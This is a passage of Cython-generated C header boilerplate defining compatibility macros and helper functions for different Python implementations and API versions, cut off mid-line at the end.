#elif defined(__GNUC__)\n    #define CYTHON_INLINE __inline__\n  #elif defined(_MSC_VER)\n    #define CYTHON_INLINE __inline\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_INLINE inline\n  #else\n    #define CYTHON_INLINE\n  #endif\n#endif\n\n\n#define __PYX_BUILD_PY_SSIZE_T "n"\n#define CYTHON_FORMAT_SSIZE_T "z"\n#define __Pyx_BUILTIN_MODULE_NAME "builtins"\n#define __Pyx_DefaultClassType PyType_Type\n#if CYTHON_COMPILING_IN_LIMITED_API\n    #ifndef CO_OPTIMIZED\n    static int CO_OPTIMIZED;\n    #endif\n    #ifndef CO_NEWLOCALS\n    static int CO_NEWLOCALS;\n    #endif\n    #ifndef CO_VARARGS\n    static int CO_VARARGS;\n    #endif\n    #ifndef CO_VARKEYWORDS\n    static int CO_VARKEYWORDS;\n    #endif\n    #ifndef CO_ASYNC_GENERATOR\n    static int CO_ASYNC_GENERATOR;\n    #endif\n    #ifndef CO_GENERATOR\n    static int CO_GENERATOR;\n    #endif\n    #ifndef CO_COROUTINE\n    static int CO_COROUTINE;\n    #endif\n#else\n    #ifndef CO_COROUTINE\n      #define CO_COROUTINE 0x80\n    #endif\n    #ifndef CO_ASYNC_GENERATOR\n      #define CO_ASYNC_GENERATOR 0x200\n    #endif\n#endif\nstatic int __Pyx_init_co_variables(void);\n#if PY_VERSION_HEX >= 0x030900A4 || defined(Py_IS_TYPE)\n  #define __Pyx_IS_TYPE(ob, type) Py_IS_TYPE(ob, type)\n#else\n  #define __Pyx_IS_TYPE(ob, type) (((const PyObject*)ob)->ob_type == (type))\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_Is)\n  #define __Pyx_Py_Is(x, y)  Py_Is(x, y)\n#else\n  #define __Pyx_Py_Is(x, y) ((x) == (y))\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsNone)\n  #define __Pyx_Py_IsNone(ob) Py_IsNone(ob)\n#else\n  #define __Pyx_Py_IsNone(ob) __Pyx_Py_Is((ob), Py_None)\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsTrue)\n  #define __Pyx_Py_IsTrue(ob) Py_IsTrue(ob)\n#else\n  #define __Pyx_Py_IsTrue(ob) __Pyx_Py_Is((ob), Py_True)\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsFalse)\n  #define __Pyx_Py_IsFalse(ob) Py_IsFalse(ob)\n#else\n  #define __Pyx_Py_IsFalse(ob) __Pyx_Py_Is((ob), Py_False)\n#endif\n#define __Pyx_NoneAsNull(obj)  (__Pyx_Py_IsNone(obj) ? NULL : (obj))\n#if PY_VERSION_HEX >= 0x030900F0 && !CYTHON_COMPILING_IN_PYPY\n  #define __Pyx_PyObject_GC_IsFinalized(o) PyObject_GC_IsFinalized(o)\n#else\n  #define __Pyx_PyObject_GC_IsFinalized(o) _PyGC_FINALIZED(o)\n#endif\n#ifndef Py_TPFLAGS_CHECKTYPES\n  #define Py_TPFLAGS_CHECKTYPES 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_INDEX\n  #define Py_TPFLAGS_HAVE_INDEX 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_NEWBUFFER\n  #define Py_TPFLAGS_HAVE_NEWBUFFER 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_FINALIZE\n  #define Py_TPFLAGS_HAVE_FINALIZE 0\n#endif\n#ifndef Py_TPFLAGS_SEQUENCE\n  #define Py_TPFLAGS_SEQUENCE 0\n#endif\n#ifndef Py_TPFLAGS_MAPPING\n  #define Py_TPFLAGS_MAPPING 0\n#endif\n#ifndef METH_STACKLESS\n  #define METH_STACKLESS 0\n#endif\n#ifndef METH_FASTCALL\n  #ifndef METH_FASTCALL\n     #define METH_FASTCALL 0x80\n  #endif\n  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);\n  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,\n                                                          Py_ssize_t nargs, PyObject *kwnames);\n#else\n  #if PY_VERSION_HEX >= 0x030d00A4\n  #  define __Pyx_PyCFunctionFast PyCFunctionFast\n  #  define __Pyx_PyCFunctionFastWithKeywords PyCFunctionFastWithKeywords\n  #else\n  #  define __Pyx_PyCFunctionFast _PyCFunctionFast\n  #  define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords\n  #endif\n#endif\n#if CYTHON_METH_FASTCALL\n  #define __Pyx_METH_FASTCALL METH_FASTCALL\n  #define __Pyx_PyCFunction_FastCall __Pyx_PyCFunctionFast\n  #define __Pyx_PyCFunction_FastCallWithKeywords __Pyx_PyCFunctionFastWithKeywords\n#else\n  #define __Pyx_METH_FASTCALL METH_VARARGS\n  #define __Pyx_PyCFunction_FastCall PyCFunction\n  #define __Pyx_PyCFunction_FastCallWithKeywords PyCFunctionWithKeywords\n#endif\n#if CYTHON_VECTORCALL\n  #define __pyx_vectorcallfunc vectorcallfunc\n  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  PY_VECTORCALL_ARGUMENTS_OFFSET\n  #define __Pyx_PyVectorcall_NARGS(n)  PyVectorcall_NARGS((size_t)(n))\n#elif CYTHON_BACKPORT_VECTORCALL\n  typedef PyObject *(*__pyx_vectorcallfunc)(PyObject *callable, PyObject *const *args,\n                                            size_t nargsf, PyObject *kwnames);\n  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  ((size_t)1 << (8 * sizeof(size_t) - 1))\n  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(((size_t)(n)) & ~__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET))\n#else\n  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  0\n  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(n))\n#endif\n#if PY_VERSION_HEX >= 0x030900B1\n#define __Pyx_PyCFunction_CheckExact(func)  PyCFunction_CheckExact(func)\n#else\n#define __Pyx_PyCFunction_CheckExact(func)  PyCFunction_Check(func)\n#endif\n#define __Pyx_CyOrPyCFunction_Check(func)  PyCFunction_Check(func)\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_CyOrPyCFunction_GET_FUNCTION(func)  (((PyCFunctionObject*)(func))->m_ml->ml_meth)\n#elif !CYTHON_COMPILING_IN_LIMITED_API\n#define __Pyx_CyOrPyCFunction_GET_FUNCTION(func)  PyCFunction_GET_FUNCTION(func)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_CyOrPyCFunction_GET_FLAGS(func)  (((PyCFunctionObject*)(func))->m_ml->ml_flags)\nstatic CYTHON_INLINE PyObject* __Pyx_CyOrPyCFunction_GET_SELF(PyObject *func) {\n    return (__Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_STATIC) ? NULL : ((PyCFunctionObject*)func)->m_self;\n}\n#endif\nstatic CYTHON_INLINE int __Pyx__IsSameCFunction(PyObject *func, void (*cfunc)(void)) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n    return PyCFunction_Check(func) && PyCFunction_GetFunction(func) == (PyCFunction) cfunc;\n#else\n    return PyCFunction_Check(func) && PyCFunction_GET_FUNCTION(func) == (PyCFunction) cfunc;\n#endif\n}\n#define __Pyx_IsSameCFunction(func, cfunc)   __Pyx__IsSameCFunction(func, cfunc)\n#if __PYX_LIMITED_VERSION_HEX < 0x03090000\n  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  ((void)m, PyType_FromSpecWithBases(s, b))\n  typedef PyObject *(*__Pyx_PyCMethod)(PyObject *, PyTypeObject *, PyObject *const *, size_t, PyObject *);\n#else\n  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  PyType_FromModuleAndSpec(m, s, b)\n  #define __Pyx_PyCMethod  PyCMethod\n#endif\n#ifndef METH_METHOD\n  #define METH_METHOD 0x200\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)\n  #define PyObject_Malloc(s)   PyMem_Malloc(s)\n  #define PyObject_Free(p)     PyMem_Free(p)\n  #define PyObject_Realloc(p)  PyMem_Realloc(p)\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)\n#elif CYTHON_COMPILING_IN_GRAAL\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) _PyFrame_SetLineNumber((frame), (lineno))\n#else\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_PyThreadState_Current PyThreadState_Get()\n#elif !CYTHON_FAST_THREAD_STATE\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#elif PY_VERSION_HEX >= 0x030d00A1\n  #define __Pyx_PyThreadState_Current PyThreadState_GetUnchecked()\n#else\n  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()\n#endif\n#if CYTHON_USE_MODULE_STATE\nstatic CYTHON_INLINE void *__Pyx__PyModule_GetState(PyObject *op)\n{\n    void *result;\n    result = PyModule_GetState(op);\n    if (!result)\n        Py_FatalError("Couldn\'t find the module state");\n    return result;\n}\n#define __Pyx_PyModule_GetState(o) (__pyx_mstatetype *)__Pyx__PyModule_GetState(o)\n#else\n#define __Pyx_PyModule_GetState(op) ((void)op,__pyx_mstate_global)\n#endif\n#define __Pyx_PyObject_GetSlot(obj, name, func_ctype)  __Pyx_PyType_GetSlot(Py_TYPE((PyObject *) obj), name, func_ctype)\n#define __Pyx_PyObject_TryGetSlot(obj, name, func_ctype) __Pyx_PyType_TryGetSlot(Py_TYPE(obj), name, func_ctype)\n#define __Pyx_PyObject_GetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_GetSubSlot(Py_TYPE(obj), sub, name, func_ctype)\n#define __Pyx_PyObject_TryGetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_TryGetSubSlot(Py_TYPE(obj), sub, name, func_ctype)\n#if CYTHON_USE_TYPE_SLOTS\n  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((type)->name)\n  #define __Pyx_PyType_TryGetSlot(type, name, func_ctype) __Pyx_PyType_GetSlot(type, name, func_ctype)\n  #define __Pyx_PyType_GetSubSlot(type, sub, name, func_ctype) (((type)->sub) ? ((type)->sub->name) : NULL)\n  #define __Pyx_PyType_TryGetSubSlot(type, sub, name, func_ctype) __Pyx_PyType_GetSubSlot(type, sub, name, func_ctype)\n#else\n  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((func_ctype) PyType_GetSlot((type), Py_##name))\n  #define __Pyx_PyType_TryGetSlot(type, name, func_ctype)\\\n    ((__PYX_LIMITED_VERSION_HEX >= 0x030A0000 ||\\\n     (PyType_GetFlags(type) & Py_TPFLAGS_HEAPTYPE) || __Pyx_get_runtime_version() >= 0x030A0000) ?\\\n     __Pyx_PyType_GetSlot(type, name, func_ctype) : NULL)\n  #define __Pyx_PyType_GetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_GetSlot(obj, name, func_ctype)\n  #define __Pyx_PyType_TryGetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_TryGetSlot(obj, name, func_ctype)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)\n#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))\n#else\n#define __Pyx_PyDict_NewPresized(n)  PyDict_New()\n#endif\n#define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)\n#define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)\n#if CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_UNICODE_INTERNALS\n#define __Pyx_PyDict_GetItemStrWithError(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)\nstatic CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStr(PyObject *dict, PyObject *name) {\n    PyObject *res = __Pyx_PyDict_GetItemStrWithError(dict, name);\n    if (res == NULL) PyErr_Clear();\n    return res;\n}\n#elif !CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07020000\n#define __Pyx_PyDict_GetItemStrWithError  PyDict_GetItemWithError\n#define __Pyx_PyDict_GetItemStr           PyDict_GetItem\n#else\nstatic CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStrWithError(PyObject *dict, PyObject *name) {\n#if CYTHON_COMPILING_IN_PYPY\n    return PyDict_GetItem(dict, name);\n#else\n    PyDictEntry *ep;\n    PyDictObject *mp = (PyDictObject*) dict;\n    long hash = ((PyStringObject *) name)->ob_shash;\n    assert(hash != -1);\n    ep = (mp->ma_lookup)(mp, name, hash);\n    if (ep == NULL) {\n        return NULL;\n    }\n    return ep->me_value;\n#endif\n}\n#define __Pyx_PyDict_GetItemStr           PyDict_GetItem\n#endif\n#if CYTHON_USE_TYPE_SLOTS\n  #define __Pyx_PyType_GetFlags(tp)   (((PyTypeObject *)tp)->tp_flags)\n  #define __Pyx_PyType_HasFeature(type, feature)  ((__Pyx_PyType_GetFlags(type) & (feature)) != 0)\n#else\n  #define __Pyx_PyType_GetFlags(tp)   (PyType_GetFlags((PyTypeObject *)tp))\n  #define __Pyx_PyType_HasFeature(type, feature)  PyType_HasFeature(type, feature)\n#endif\n#define __Pyx_PyObject_GetIterNextFunc(iterator)  __Pyx_PyObject_GetSlot(iterator, tp_iternext, iternextfunc)\n#if CYTHON_USE_TYPE_SPECS && PY_VERSION_HEX >= 0x03080000\n#define __Pyx_PyHeapTypeObject_GC_Del(obj)  {\\\n    PyTypeObject *type = Py_TYPE((PyObject*)obj);\\\n    assert(__Pyx_PyType_HasFeature(type, Py_TPFLAGS_HEAPTYPE));\\\n    PyObject_GC_Del(obj);\\\n    Py_DECREF(type);\\\n}\n#else\n#define __Pyx_PyHeapTypeObject_GC_Del(obj)  PyObject_GC_Del(obj)\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_PyUnicode_READY(op)       (0)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_ReadChar(u, i)\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((void)u, 1114111U)\n  #define __Pyx_PyUnicode_KIND(u)         ((void)u, (0))\n  #define __Pyx_PyUnicode_DATA(u)         ((void*)u)\n  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)k, PyUnicode_ReadChar((PyObject*)(d), i))\n  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GetLength(u))\n#else\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_READY(op)       (0)\n  #else\n    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\\\n                                                0 : _PyUnicode_Ready((PyObject *)(op)))\n  #endif\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)\n  #define __Pyx_PyUnicode_KIND(u)         ((int)PyUnicode_KIND(u))\n  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)\n  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, (Py_UCS4) ch)\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))\n  #else\n    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))\n    #else\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))\n    #endif\n  #endif\n#endif\n#if CYTHON_COMPILING_IN_PYPY\n  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)\n#else\n  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\\\n      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))\n#endif\n#if CYTHON_COMPILING_IN_PYPY\n  #if !defined(PyUnicode_DecodeUnicodeEscape)\n    #define PyUnicode_DecodeUnicodeEscape(s, size, errors)  PyUnicode_Decode(s, size, "unicode_escape", errors)\n  #endif\n  #if !defined(PyUnicode_Contains)\n    #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)\n  #endif\n  #if !defined(PyByteArray_Check)\n    #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)\n  #endif\n  #if !defined(PyObject_Format)\n    #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)\n  #endif\n#endif\n#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))\n#if CYTHON_COMPILING_IN_CPYTHON\n  #define __Pyx_PySequence_ListKeepNew(obj)\\\n    (likely(PyList_CheckExact(obj) && Py_REFCNT(obj) == 1) ? __Pyx_NewRef(obj) : PySequence_List(obj))\n#else\n  #define __Pyx_PySequence_ListKeepNew(obj)  PySequence_List(obj)\n#endif\n#ifndef PySet_CheckExact\n  #define PySet_CheckExact(obj)        __Pyx_IS_TYPE(obj, &PySet_Type)\n#endif\n#if PY_VERSION_HEX >= 0x030900A4\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)\n#else\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)\n#endif\n#if CYTHON_AVOID_BORROWED_REFS || CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n  #if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n    #define __Pyx_PyList_GetItemRef(o, i) PyList_GetItemRef(o, i)\n  #elif CYTHON_COMPILING_IN_LIMITED_API || !CYTHON_ASSUME_SAFE_MACROS\n    #define __Pyx_PyList_GetItemRef(o, i) (likely((i) >= 0) ? PySequence_GetItem(o, i) : (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))\n  #else\n    #define __Pyx_PyList_GetItemRef(o, i) PySequence_ITEM(o, i)\n  #endif\n#elif CYTHON_COMPILING_IN_LIMITED_API || !CYTHON_ASSUME_SAFE_MACROS\n  #if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n    #define __Pyx_PyList_GetItemRef(o, i) PyList_GetItemRef(o, i)\n  #else\n    #define __Pyx_PyList_GetItemRef(o, i) __Pyx_XNewRef(PyList_GetItem(o, i))\n  #endif\n#else\n  #define __Pyx_PyList_GetItemRef(o, i) __Pyx_NewRef(PyList_GET_ITEM(o, i))\n#endif\n#if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n#define __Pyx_PyDict_GetItemRef(dict, key, result) PyDict_GetItemRef(dict, key, result)\n#elif CYTHON_AVOID_BORROWED_REFS || CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\nstatic CYTHON_INLINE int __Pyx_PyDict_GetItemRef(PyObject *dict, PyObject *key, PyObject **result) {\n  *result = PyObject_GetItem(dict, key);\n  if (*result == NULL) {\n    if (PyErr_ExceptionMatches(PyExc_KeyError)) {\n      PyErr_Clear();\n      return 0;\n    }\n    return -1;\n  }\n  return 1;\n}\n#else\nstatic CYTHON_INLINE int __Pyx_PyDict_GetItemRef(PyObject *dict, PyObject *key, PyObject **result) {\n  *result = PyDict_GetItemWithError(dict, key);\n  if (*result == NULL) {\n    return PyErr_Occurred() ? -1 : 0;\n  }\n  Py_INCREF(*result);\n  return 1;\n}\n#endif\n#if defined(CYTHON_DEBUG_VISIT_CONST) && CYTHON_DEBUG_VISIT_CONST\n  #define __Pyx_VISIT_CONST(obj)  Py_VISIT(obj)\n#else\n  #define __Pyx_VISIT_CONST(obj)\n#endif\n#if CYTHON_ASSUME_SAFE_MACROS\n  #define __Pyx_PySequence_ITEM(o, i) PySequence_ITEM(o, i)\n  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)\n  #define __Pyx_PyTuple_SET_ITEM(o, i, v) (PyTuple_SET_ITEM(o, i, v), (0))\n  #define __Pyx_PyTuple_GET_ITEM(o, i) PyTuple_GET_ITEM(o, i)\n  #define __Pyx_PyList_SET_ITEM(o, i, v) (PyList_SET_ITEM(o, i, v), (0))\n  #define __Pyx_PyList_GET_ITEM(o, i) PyList_GET_ITEM(o, i)\n#else\n  #define __Pyx_PySequence_ITEM(o, i) PySequence_GetItem(o, i)\n  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)\n  #define __Pyx_PyTuple_SET_ITEM(o, i, v) PyTuple_SetItem(o, i, v)\n  #define __Pyx_PyTuple_GET_ITEM(o, i) PyTuple_GetItem(o, i)\n  #define __Pyx_PyList_SET_ITEM(o, i, v) PyList_SetItem(o, i, v)\n  #define __Pyx_PyList_GET_ITEM(o, i) PyList_GetItem(o, i)\n#endif\n#if CYTHON_ASSUME_SAFE_SIZE\n  #define __Pyx_PyTuple_GET_SIZE(o) PyTuple_GET_SIZE(o)\n  #define __Pyx_PyList_GET_SIZE(o) PyList_GET_SIZE(o)\n  #define __Pyx_PySet_GET_SIZE(o) PySet_GET_SIZE(o)\n  #define __Pyx_PyBytes_GET_SIZE(o) PyBytes_GET_SIZE(o)\n  #define __Pyx_PyByteArray_GET_SIZE(o) PyByteArray_GET_SIZE(o)\n  #define __Pyx_PyUnicode_GET_LENGTH(o) PyUnicode_GET_LENGTH(o)\n#else\n  #define __Pyx_PyTuple_GET_SIZE(o) PyTuple_Size(o)\n  #define __Pyx_PyList_GET_SIZE(o) PyList_Size(o)\n  #define __Pyx_PySet_GET_SIZE(o) PySet_Size(o)\n  #define __Pyx_PyBytes_GET_SIZE(o) PyBytes_Size(o)\n  #define __Pyx_PyByteArray_GET_SIZE(o) PyByteArray_Size(o)\n  #define __Pyx_PyUnicode_GET_LENGTH(o) PyUnicode_GetLength(o)\n#endif\n#if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n  #define __Pyx_PyImport_AddModuleRef(name) PyImport_AddModuleRef(name)\n#else\n  static CYTHON_INLINE PyObject *__Pyx_PyImport_AddModuleRef(const char *name) {\n      PyObject *module = PyImport_AddModule(name);\n      Py_XINCREF(module);\n      return module;\n  }\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_InternFromString)\n  #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)\n#endif\n#define __Pyx_PyLong_FromHash_t PyLong_FromSsize_t\n#define __Pyx_PyLong_AsHash_t   __Pyx_PyIndex_AsSsize_t\n#if __PYX_LIMITED_VERSION_HEX >= 0x030A0000\n    #define __Pyx_PySendResult PySendResult\n#else\n    typedef enum {\n        PYGEN_RETURN = 0,\n        PYGEN_ERROR = -1,\n        PYGEN_NEXT = 1,\n    } __Pyx_PySendResult;\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API || PY_VERSION_HEX < 0x030A00A3\n  typedef __Pyx_PySendResult (*__Pyx_pyiter_sendfunc)(PyObject *iter, PyObject *value, PyObject **result);\n#else\n  #define __Pyx_pyiter_sendfunc sendfunc\n#endif\n#if !CYTHON_USE_AM_SEND\n#define __PYX_HAS_PY_AM_SEND 0\n#elif __PYX_LIMITED_VERSION_HEX >= 0x030A0000\n#define __PYX_HAS_PY_AM_SEND 1\n#else\n#define __PYX_HAS_PY_AM_SEND 2  // our own backported implementation\n#endif\n#if __PYX_HAS_PY_AM_SEND < 2\n    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods\n#else\n    typedef struct {\n        unaryfunc am_await;\n        unaryfunc am_aiter;\n        unaryfunc am_anext;\n        __Pyx_pyiter_sendfunc am_send;\n    } __Pyx_PyAsyncMethodsStruct;\n    #define __Pyx_SlotTpAsAsync(s) ((PyAsyncMethods*)(s))\n#endif\n#if CYTHON_USE_AM_SEND && PY_VERSION_HEX < 0x030A00F0\n    #define __Pyx_TPFLAGS_HAVE_AM_SEND (1UL << 21)\n#else\n    #define __Pyx_TPFLAGS_HAVE_AM_SEND (0)\n#endif\n#if PY_VERSION_HEX >= 0x03090000\n#define __Pyx_PyInterpreterState_Get() PyInterpreterState_Get()\n#else\n#define __Pyx_PyInterpreterState_Get() PyThreadState_Get()->interp\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030A0000\n#ifdef __cplusplus\nextern "C"\n#endif\nPyAPI_FUNC(void *) PyMem_Calloc(size_t nelem, size_t elsize);\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic int __Pyx_init_co_variable(PyObject *inspect, const char* name, int *write_to) {\n    int value;\n    PyObject *py_value = PyObject_GetAttrString(inspect, name);\n    if (!py_value) return 0;\n    value = (int) PyLong_AsLong(py_value);\n    Py_DECREF(py_value);\n    *write_to = value;\n    return value != -1 || !PyErr_Occurred();\n}\nstatic int __Pyx_init_co_variables(void) {\n    PyObject *inspect;\n    int result;\n    inspect = PyImport_ImportModule("inspect");\n    result =\n#if !defined(CO_OPTIMIZED)\n        __Pyx_init_co_variable(inspect, "CO_OPTIMIZED", &CO_OPTIMIZED) &&\n#endif\n#if !defined(CO_NEWLOCALS)\n        __Pyx_init_co_variable(inspect, "CO_NEWLOCALS", &CO_NEWLOCALS) &&\n#endif\n#if !defined(CO_VARARGS)\n        __Pyx_init_co_variable(inspect, "CO_VARARGS", &CO_VARARGS) &&\n#endif\n#if !defined(CO_VARKEYWORDS)\n        __Pyx_init_co_variable(inspect, "CO_VARKEYWORDS", &CO_VARKEYWORDS) &&\n#endif\n#if !defined(CO_ASYNC_GENERATOR)\n        __Pyx_init_co_variable(inspect, "CO_ASYNC_GENERATOR", &CO_ASYNC_GENERATOR) &&\n#endif\n#if !defined(CO_GENERATOR)\n        __Pyx_init_co_variable(inspect, "CO_GENERATOR", &CO_GENERATOR) &&\n#endif\n#if !defined(CO_COROUTINE)\n        __Pyx_init_co_variable(inspect, "CO_COROUTINE", &CO_COROUTINE) &&\n#endif\n        1;\n    Py_DECREF(inspect);\n    return result ? 0 : -1;\n}\n#else\nstatic int __Pyx_init_co_variables(void) {\n    return 0;  // It\'s a limited API-only feature\n}\n#endif\n\n\n#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)\n  #ifndef _USE_MATH_DEFINES\n    #define _USE_MATH_DEFINES\n  #endif\n#endif\n#include <math.h>\n#ifdef NAN\n#define __PYX_NAN() ((float) NAN)\n#else\nstatic CYTHON_INLINE float __PYX_NAN() {\n  float value;\n  memset(&value, 0xFF, sizeof(value));\n  return value;\n}\n#endif\n#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)\n#define __Pyx_truncl trunc\n#else\n#define __Pyx_truncl truncl\n#endif\n\n#ifndef CYTHON_CLINE_IN_TRACEBACK_RUNTIME\n#define CYTHON_CLINE_IN_TRACEBACK_RUNTIME 0\n#endif\n#ifndef CYTHON_CLINE_IN_TRACEBACK\n#define CYTHON_CLINE_IN_TRACEBACK CYTHON_CLINE_IN_TRACEBACK_RUNTIME\n#endif\n#if CYTHON_CLINE_IN_TRACEBACK\n#define __PYX_MARK_ERR_POS(f_index, lineno)  { __pyx_filename = __pyx_f[f_index]; (void) __pyx_filename; __pyx_lineno = lineno; (void) __pyx_lineno; __pyx_clineno = __LINE__; (void) __pyx_clineno; }\n#else\n#define __PYX_MARK_ERR_POS(f_index, lineno)  { __pyx_filename = __pyx_f[f_index]; (void) __pyx_filename; __pyx_lineno = lineno; (void) __pyx_lineno; (void) __pyx_clineno; }\n#endif\n#define __PYX_ERR(f_index, lineno, Ln_error) \\\n    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }\n\n#ifdef CYTHON_EXTERN_C\n    #undef __PYX_EXTERN_C\n    #define __PYX_EXTERN_C CYTHON_EXTERN_C\n#elif defined(__PYX_EXTERN_C)\n    #ifdef _MSC_VER\n    #pragma message ("Please do not define the \'__PYX_EXTERN_C\' macro externally. Use \'CYTHON_EXTERN_C\' instead.")\n    #else\n    #warning Please do not define the \'__PYX_EXTERN_C\' macro externally. Use \'CYTHON_EXTERN_C\' instead.\n    #endif\n#else\n  #ifdef __cplusplus\n    #define __PYX_EXTERN_C extern "C"\n  #else\n    #define __PYX_EXTERN_C extern\n  #endif\n#endif\n\n#define __PYX_HAVE__op\n#define __PYX_HAVE_API__op\n\n#ifdef _OPENMP\n#include <omp.h>\n#endif \n\n#if defined(PYREX_WITHOUT_ASSERTIONS) && 